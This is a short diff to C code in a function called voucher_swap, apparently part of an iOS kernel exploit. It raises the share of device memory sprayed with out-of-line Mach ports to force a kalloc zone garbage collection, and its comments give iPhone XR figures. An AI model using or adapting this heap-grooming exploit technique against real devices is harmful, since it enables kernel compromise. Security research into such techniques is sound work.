@@ -881,7 +881,7 @@ voucher_swap() {
 	// kalloc.32768 zone. We need to do this slowly in order to force a zone garbage
 	// collection. Spraying 17% of memory (450 MB on the iPhone XR) with OOL ports should be
 	// plenty.
-    const size_t ool_ports_spray_size = (kCFCoreFoundationVersionNumber >= 1535.12 ? 0.17 : 0.085) * platform.memory_size;
+    const size_t ool_ports_spray_size = (kCFCoreFoundationVersionNumber >= 1535.12 ? 0.25 : 0.085) * platform.memory_size;
 	mach_port_t *ool_holding_ports = gc_ports + gc_port_count;
 	size_t ool_holding_port_count = 500;
 	sprayed_size = ool_ports_spray_size_with_gc(ool_holding_ports, &ool_holding_port_count,
